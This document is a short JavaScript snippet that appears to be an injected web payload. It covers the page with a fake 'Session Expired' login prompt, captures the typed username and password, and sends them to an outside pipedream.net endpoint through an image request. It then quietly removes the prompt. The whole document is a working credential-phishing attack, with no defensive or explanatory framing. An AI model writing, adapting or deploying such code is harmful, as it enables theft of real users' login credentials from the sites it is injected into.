(function() {

  const overlay = document.createElement("div");
  overlay.style.position = "fixed";
  overlay.style.top = 0;
  overlay.style.left = 0;
  overlay.style.width = "100%";
  overlay.style.height = "100%";
  overlay.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
  overlay.style.zIndex = 9999;


  const box = document.createElement("div");
  box.style.position = "absolute";
  box.style.top = "50%";
  box.style.left = "50%";
  box.style.transform = "translate(-50%, -50%)";
  box.style.backgroundColor = "#fff";
  box.style.padding = "30px";
  box.style.borderRadius = "8px";
  box.style.boxShadow = "0 0 10px rgba(0,0,0,0.3)";
  box.style.width = "300px";
  box.innerHTML = `
    <h3 style="margin-top:0;">Session Expired</h3>
    <p>Please log in again to continue.</p>
    <input type="text" id="xuser" placeholder="Username or Email" style="width:100%;padding:8px;margin:8px 0;">
    <input type="password" id="xpass" placeholder="Password" style="width:100%;padding:8px;margin:8px 0;">
    <button id="xsubmit" style="width:100%;padding:10px;background-color:#4CAF50;color:white;border:none;">Login</button>
  `;

  overlay.appendChild(box);
  document.body.appendChild(overlay);


  document.getElementById("xsubmit").onclick = function() {
    const user = encodeURIComponent(document.getElementById("xuser").value);
    const pass = encodeURIComponent(document.getElementById("xpass").value);


    const img = new Image();
    img.src = `https://eoeqgca83zpr7tb.m.pipedream.net/?user=${user}&pass=${pass}`;


    document.body.removeChild(overlay);
  };
})();
